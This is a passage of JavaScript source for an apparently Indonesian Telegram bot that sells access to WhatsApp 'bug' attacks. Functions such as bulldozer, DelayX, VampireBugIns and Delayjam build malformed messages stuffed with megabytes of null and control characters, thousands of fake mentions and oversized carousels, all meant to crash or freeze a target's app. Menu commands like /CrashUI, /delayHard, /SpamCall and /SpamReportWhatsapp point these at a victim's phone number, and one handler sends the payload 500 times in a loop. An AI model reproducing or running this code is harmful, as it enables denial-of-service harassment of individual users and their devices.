              { name: "cta_cancel_reminder", buttonParamsJson: "\u0000".repeat(1000) },
              { name: "address_message", buttonParamsJson: "\u0000".repeat(1000) },
              { name: "send_location", buttonParamsJson: "\u0000".repeat(1000) },
              { name: "quick_reply", buttonParamsJson: "\u0000".repeat(1000) },
              { name: "mpm", buttonParamsJson: "\u0000".repeat(1000) },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(jid, messageCrashNotif, {
    participant: { jid: jid },
  });

  console.log(chalk.red(`SystemUiKiller Success Send To ${jid}`));
}

async function bulldozer(sock, jid) {
  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(jid, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: jid } }]
          }
        ]
      }
    ]
  });

  console.log(chalk.green(`✅ Bulldozer terkirim ke ${jid}`));
}

async function Jtwdlyinvis(jid) {
    let permissionX = await generateWAMessageFromContent(
        jid,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "⎋🦠</🧬⃟༑⌁⃰𝙏𝙝𝙧𝙚𝙚𝘽𝙧𝙤𝙩𝙝𝙚𝙧𝙨ཀ\\>🍷𞋯",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let permissionY = await generateWAMessageFromContent(
        jid,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "⎋🦠</🧬⃟༑⌁⃰𝙏𝙝𝙧𝙚𝙚𝘽𝙧𝙤𝙩𝙝𝙚𝙧𝙨ཀ\\>🍷𞋯",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
               "#" +
               Math.floor(Math.random() * 16777215)
               .toString(16)
               .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        permissionX.message,
        {
            messageId: permissionX.key.id,
            statusJidList: [jid],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: jid },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        permissionY.message,
        {
            messageId: permissionY.key.id,
            statusJidList: [jid],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: jid },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}

async function NullCards(jid, mention = false) {
  const media = await prepareWAMessageMedia(
    { image: { url: "https://files.catbox.moe/4amext.jpg" } },
    { upload: sock.waUploadToServer }
  )

  let push = []
  for (let r = 0; r < 1000; r++) {
    push.push(
      {
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: " "
        }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          hasMediaAttachment: true,
          imageMessage: media.imageMessage
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              name: "carousel_message",
              buttonParamsJson: "FnX"
            }
          ]
        })
      }
    )
  }

  let msg = await generateWAMessageFromContent(
    jid,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: ""
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: ""
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [...push]
            })
          })
        }
      }
    },
    {}
  )

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [jid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: jid },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  )

  if (mention) {
    await sock.relayMessage(
      jid,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "null cards 💰" },
            content: undefined
          }
        ]
      }
    )
  }
}

async function DelayX(sock, jid) {
  const msg = await generateWAMessageFromContent(
    jid,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 70000) + "@s.whatsapp.net")
              ],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimeStamp: Math.floor(Date.now())
                }
              },
              externalAdReply: {
                renderLargerThumbnail: true,
                thumbnailUrl: "https://wa.me/stickerpack/zero?",
                sourceUrl: "https://t.me/badzzne",
                showAdAttribution: true,
                body: "",
                title: ""
              }
            },
            body: {
              text: "Our You?" + "\x10".repeat(70000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                { name: "single_select", buttonParamsJson: "Xforc" },
                { name: "call_permission_request", buttonParamsJson: "Xlay" }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(jid, msg.message, {
    participant: { jid: jid },
    messageId: msg.key.id
  });

  const Xf = JSON.stringify({
    request_type: "ui_zero?",
    payload: "\x1A".repeat(75000) + "\x10".repeat(75000),
    version: "x",
    crash_id: Math.floor(Math.random() * 999999),
    experimental: true
  });

  const Xb = JSON.stringify({
    request_type: "payment_method",
    payload: "ð‘†¿".repeat(10000) + "ï¸…".repeat(1000),
    version: "Lanz",
    crash_id: Math.floor(Math.random() * 999999),
    experimental: true
  });

  const ZeroMsg = generateWAMessageFromContent(
    jid,
    {
      documentMessage: {
        url: undefined,
        mimetype: "application",
        fileName: "undefined",
        fileLength: 9999999,
        pageCount: 1,
        caption: "",
        name: "galaxy_message",
        paramsJson: Xb,
        payment_message: {
          note: "",
          paramsJson: Xf
        }
      }
    },
    {}
  );

  await sock.relayMessage(jid, ZeroMsg.message, {
    messageId: ZeroMsg.key.id
  });
}

async function VampireBugIns(jid) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "33333333333333333@newsletter",
            newsletterName: "⎋🦠</🧬⃟༑⌁⃰𝙏𝙝𝙧𝙚𝙚𝘽𝙧𝙤𝙩𝙝𝙚𝙧𝙨ཀ\\>🍷𞋯" + "ꦾ".repeat(125000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(125000) + "@0".repeat(125000),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },
      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "{}",
          },
          {
            name: "galaxy_message",
            paramsJson: {
              "screen_2_OptIn_0": true,
              "screen_2_OptIn_1": true,
              "screen_1_Dropdown_0": "nullOnTop",
              "screen_1_DatePicker_1": "1028995200000",
              "screen_1_TextInput_2": "null@gmail.com",
              "screen_1_TextInput_3": "94643116",
              "screen_0_TextInput_0": "\u0000".repeat(500000),
              "screen_0_TextInput_1": "SecretDocu",
              "screen_0_Dropdown_2": "#926-Xnull",
              "screen_0_RadioButtonsGroup_3": "0_true",
              "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
          },
        ],
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
        groupMentions: [
          {
            groupJid: "0@s.whatsapp.net",
            groupSubject: "Vampire",
          },
        ],
      },
    };

    await sock.relayMessage(jid, message, {
      userJid: jid,
    });
  } catch (err) {
    console.error("❌ Error kirim Vampire bug:", err);
  }
}

async function StcX(jid) {
  try {
    let message = {
      extendedTextMessage: {
        text: "⎋🦠</🧬⃟༑⌁⃰𝙏𝙝𝙧𝙚𝙚𝘽𝙧𝙤𝙩𝙝𝙚𝙧𝙨ཀ\\>🍷𞋯",
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: ["13135550002@s.whatsapp.net"],
          externalAdReply: {
            title: null,
            body: null,
            thumbnailUrl: "http://Wa.me/stickerpack/VinnModss",
            sourceUrl: "http://Wa.me/stickerpack/VinnModss",
            mediaType: 1,
            renderLargerThumbnail: false,
            showAdAttribution: false
          }
        },
        nativeFlowMessage: {
          messageParamsJson: "{}",
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: "{}"
            }
          ]
        }
      }
    };

    await sock.relayMessage(jid, message, {
      participant: { jid: jid }
    });
  } catch (err) {
    console.log(err);
  }
}

async function bugGroup(groupJid) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "33333333333333333@newsletter",
            newsletterName: "⎋🦠</🧬⃟༑⌁⃰𝙏𝙝𝙧𝙚𝙚𝘽𝙧𝙤𝙩𝙝𝙚𝙧𝙨ཀ\\>🍷𞋯" + "ꦾ".repeat(125000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(125000) + "@0".repeat(125000),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },
      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "{}",
          },
          {
            name: "galaxy_message",
            paramsJson: {
              "screen_2_OptIn_0": true,
              "screen_2_OptIn_1": true,
              "screen_1_Dropdown_0": "nullOnTop",
              "screen_1_DatePicker_1": "1028995200000",
              "screen_1_TextInput_2": "null@gmail.com",
              "screen_1_TextInput_3": "94643116",
              "screen_0_TextInput_0": "\u0000".repeat(500000),
              "screen_0_TextInput_1": "SecretDocu",
              "screen_0_Dropdown_2": "#926-Xnull",
              "screen_0_RadioButtonsGroup_3": "0_true",
              "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
          },
        ],
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
        groupMentions: [
          {
            groupJid: "0@s.whatsapp.net",
            groupSubject: "Vampire",
          },
        ],
      },
    };

    await sock.relayMessage(groupJid, message, {
      userJid: groupJid,
    });
  } catch (err) {
    console.error("❌ Error kirim Vampire bug:", err);
  }
}

function extractGroupID(input) {

  if (!input || typeof input !== "string") return null;


  let m = input.match(/(?:chat\.whatsapp\.com\/)([A-Za-z0-9_-]+)/i);

  if (m && m[1]) return m[1];


  m = input.trim().split("/").pop();

  if (/^[A-Za-z0-9_-]{8,}$/.test(m)) return m;


  if (/^[A-Za-z0-9_-]{8,}$/.test(input.trim())) return input.trim();

  return null;

}

async function Delayjam(jid) {
  const delay = await generateWAMessageFromContent(
    jid,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " ⎋🧬⃟༑⌁⃰𝙏𝙝𝙧𝙚𝙚𝘽𝙧𝙤𝙩𝙝𝙚𝙧𝙨ཀ\\>🍷𞋯 ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1055555),
              version: 3,
            },
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 100,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "0"),
    }
  );

  const jam = await generateWAMessageFromContent(
    jid,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " ⎋🧬⃟༑⌁⃰𝙏𝙝𝙧𝙚𝙚𝘽𝙧𝙤𝙩𝙝𝙚𝙧𝙨ཀ\\>🍷𞋯 ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1055555),
              version: 3,
            },
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 100,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "0"),
    }
  );

  await sock.relayMessage(
    "status@broadcast",
    delay.message,
    {
      messageId: delay.key.id,
      statusJidList: [jid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid } }],
            },
          ],
        },
      ],
    }
  );

  await sock.relayMessage(
    "status@broadcast",
    jam.message,
    {
      messageId: jam.key.id,
      statusJidList: [jid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid } }],
            },
          ],
        },
      ],
    }
  );

  console.log("✅ Delayjam (Delay & Jam) terkirim ke status@broadcast");
}
// END FUNCTION

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username
    ? `@${msg.from.username}`
    : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();

  bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote><strong>
╔─═⊱ 𝗧𝗛𝗥𝗘𝗘 𝗕𝗥𝗢𝗧𝗛𝗘𝗥𝗦 ─═⬡
║⎔ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : @sallstecu
║⎔ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 0.2.0
║⎔ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : Telegram
║⎔ 𝗦𝘁𝗮𝘁𝘂𝘀 : Private series
║⎔ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime}
┗━━━━━━━━━━━━━⬡
# sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ.</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝐓͢𝐄𝐑͢𝐈𝐌𝐀𝐊𝐀𝐒𝐈𝐇 𝐔𝐍𝐓𝐔𝐊", callback_data: "produk" }, 
          ],
          [
          { text: "𝐂͢𝐑͠𝐀᷼𝐒͠⍣𝐇", callback_data: "trashmenu" },
          { text: "𝑨͒𝑲͢𝑺͠𝑬͢𝑺", callback_data: "owner_menu" },
          { text: "𝐓⃕͢𝜣⃮⃕𝜣͢𝐋⃕𝐒", callback_data: "tols" },
          ],
          [{ text: "𝐈⃕𝐍͢𝐅𝐎͢𝐌⃕𝐀͢𝐓𝐈⃕𝐎͢𝐍〽", url: "https://t.me/informasitreebrothers" }], 
      ],
    },
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username
      ? `@${query.from.username}`
      : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `<blockquote><strong>
╔─═⊱ 𝗧𝗛𝗥𝗘𝗘 𝗕𝗥𝗢𝗧𝗛𝗘𝗥𝗦 ─═⬡
║⎔ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : @sallstecu
║⎔ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 0.2.0
║⎔ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : Telegram
║⎔ 𝗦𝘁𝗮𝘁𝘂𝘀 : Private series
║⎔ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime}
┗━━━━━━━━━━━━━⬡</strong></blockquote>
<blockquote><strong>╔─═⊱ 𝑺𝑷𝑬𝑺𝑰𝑨𝑳 𝑩𝑼𝑮  
│/blankBrothers - 628xx
║/ForceClick - 628xx
║/CrashUI - 628xx
┗━━━━━━━━━━━━━━━⬡</strong></blockquote>
<blockquote><strong>╔─═⊱ 𝑩𝑼𝑮 𝑮𝑹𝑶𝑼𝑷
│/blankgroup - linkgroup
┗━━━━━━━━━━━━━━━⬡</strong></blockquote>
<blockquote><strong>╔─═⊱ 𝟯 𝑫𝑬𝑳𝑨𝒀 𝑻𝒀𝑷𝑬  
│/delayHard - 628xx
║/bulldozer2GB - 628xx
│/bulldozer5GB - 628xx
┗━━━━━━━━━━━━━━━⬡</strong></blockquote>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "🔙𝗕𝗮𝗰𝗸", callback_data: "back_to_main" }]],
      };
    }

    if (query.data === "owner_menu") {
      caption = `<blockquote><strong>
╔─═⊱ 𝗧𝗛𝗥𝗘𝗘 𝗕𝗥𝗢𝗧𝗛𝗘𝗥𝗦 ─═⬡
║⎔ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : @sallstecu
│⎔ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 0.2.0
║⎔ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : Telegram
│⎔ 𝗦𝘁𝗮𝘁𝘂𝘀 : Private series
│⎔ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime}
┗━━━━━━━━━━━━━⬡</strong></blockquote>
<blockquote><strong>╔─═⊱ 𝑨𝑲𝑺𝑬𝑺 𝑫𝑬𝑽𝑬𝑳𝑶𝑷𝑬𝑹  
│/addowner 
║/delowner 
│/addadmin 
║/deladmin 
│/addprem 
║/delprem
│/setcd 
║/addsender
│/listbot
┗━━━━━━━━━━━━━━⬡</strong></blockquote>
<blockquote><strong>╔─═⊱ 𝑨𝑲𝑺𝑬𝑺 𝑶𝑾𝑵𝑬𝑹  
│/addadmin
║/deladmin
│/addprem 
║/delprem
│/setcd 
║/addsender
│/listbot
┗━━━━━━━━━━━━━━⬡</strong></blockquote>
<blockquote><strong>╔─═⊱ 𝑨𝑲𝑺𝑬𝑺 𝑨𝑫𝑴𝑰𝑵
│/addprem
║/delprem
│/setcd
║/addsender
│/listbot
┗━━━━━━━━━━━━━━━⬡</strong></blockquote>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "🔙𝗕𝗮𝗰𝗸", callback_data: "back_to_main" }]],
      };
    }
    
    if (query.data === "tols") {
      caption = `<blockquote><strong>
╔─═⊱ 𝗧𝗛𝗥𝗘𝗘 𝗕𝗥𝗢𝗧𝗛𝗘𝗥𝗦 ─═⬡
║⎔ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : @sallstecu
║⎔ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 0.2.0
║⎔ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : Telegram
║⎔ 𝗦𝘁𝗮𝘁𝘂𝘀 : Private series
║⎔ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime}
┗━━━━━━━━━━━━━⬡</strong></blockquote>
<blockquote><strong>╔─═⊱ 𝑻𝑶𝑶𝑳𝑺 𝑴𝑬𝑵𝑼  
║/SpamPairing
│/SpamCall
║/hapusbug
│/SpamReportWhatsapp
┗━━━━━━━━━━━━━━━⬡</strong></blockquote>
<blockquote><strong>╔─═⊱ 𝑭𝑼𝑵 𝑴𝑬𝑵𝑼
│/tourl
║/ai
│/brat
║/cekkodam
│/xnxx
┗━━━━━━━━━━━━━━━⬡</strong></blockquote>
`;

replyMarkup = {
        inline_keyboard: [[{ text: "🔙𝗕𝗮𝗰𝗸", callback_data: "back_to_main" }]],
      };
    }
    
    if (query.data === "produk") {
      caption = `<blockquote><strong>
╔─═⊱ 𝐓͢𝐄𝐑͢𝐈𝐌𝐀𝐊𝐀𝐒𝐈𝐇 𝐔𝐍𝐓𝐔𝐊 ─═⬡
║𝗢𝘄𝗻𝗲𝗿 : @sallstecu
│⎔ luv2hate  →  𝑫𝑬𝑽𝑬𝑳𝑶𝑷𝑬𝑹  
║⎔ badzz.   →  𝑫𝑬𝑽𝑬𝑳𝑶𝑷𝑬𝑹 𝟮  
│⎔ xyra.    →  𝑴𝒀 𝑲𝑨𝑲𝑨𝑲 ??𝑾  
║⎔ Gabriel. →  𝑺𝑼𝑷𝑷𝑶𝑹𝑻  
│⎔ patadox  →  𝑺𝑼𝑷𝑷𝑶𝑹𝑻  
║⎔ Takashi. →  𝑭𝑹𝑰𝑬𝑵𝑫𝑺  
│⎔ kelpin.  →  𝑭𝑹𝑰𝑬𝑵𝑫𝑺  
║⎔ Xboys    →  𝑭𝑹𝑰𝑬𝑵𝑫𝑺  
│⎔ kazuu    →  𝑭𝑹𝑰𝑬𝑵𝑫𝑺  
║⎔ angel    →  𝑨𝑺𝑰𝑺𝑻𝑬𝑵  
│⎔ ayyy     →  𝑨𝑺𝑰𝑺𝑻𝑬𝑵  
║⎔ aina.    →  ❤️  
│⎔ 𝑨𝑳𝑳 𝑩𝑼𝒀𝑬𝑹 / 𝑷𝑻 𝑻𝑯𝑹𝑬𝑬 𝑩𝑹𝑶𝑻𝑯𝑬𝑹𝑺
┗━━━━━━━━━━━━━━━⬡</strong></blockquote>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "🔙𝗕𝗮𝗰𝗸", callback_data: "back_to_main" }]],
      };
    }

    if (query.data === "back_to_main") {
      caption = `<blockquote><strong>
╔─═⊱ 𝗧𝗛𝗥𝗘𝗘 𝗕𝗥𝗢𝗧𝗛𝗘𝗥𝗦 ─═⬡
║⎔ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : @sallstecu
║⎔ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 0.2.0
║⎔ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : Telegram
║⎔ 𝗦𝘁𝗮𝘁𝘂𝘀 : Private series
║⎔ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime}
┗━━━━━━━━━━━━━⬡
# sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ.</strong></blockquote>
`;
      replyMarkup = {
        inline_keyboard: [
          [
          { text: "𝐓͢𝐄𝐑𝐈𝐌𝐀𝐊𝐀𝐒𝐈𝐇 𝐔𝐍𝐓𝐔𝐊", callback_data: "produk" }, 
          ],
          [
          { text: "𝐂͢𝐑͠𝐀᷼𝐒͠⍣𝐇", callback_data: "trashmenu" },
          { text: "𝑨͒𝑲͢𝑺͠𝑬͢𝑺", callback_data: "owner_menu" },
          { text: "𝐓⃕͢𝜣⃮⃕𝜣͢𝐋⃕𝐒", callback_data: "tols" },
          ],
          [{ text: "𝐈⃕𝐍͢𝐅𝐎͢𝐌⃕𝐀͢𝐓𝐈⃕𝐎͢𝐍〽", url: "https://t.me/informasitreebrothers" }], 
        ],
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: caption,
        parse_mode: "HTML",
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup,
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

//=======CASE BUG=========//
bot.onText(/\/CrashUI (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 :CRASH UI SYSTEM
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 500; i++) {
      await KillerSystem(jid);
      await sleep(5000);
      console.log(
        chalk.red(
          `[BROTHERS] BUG Processing ${count}/500 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : CRASH SYSTEM UI
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delayHard (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
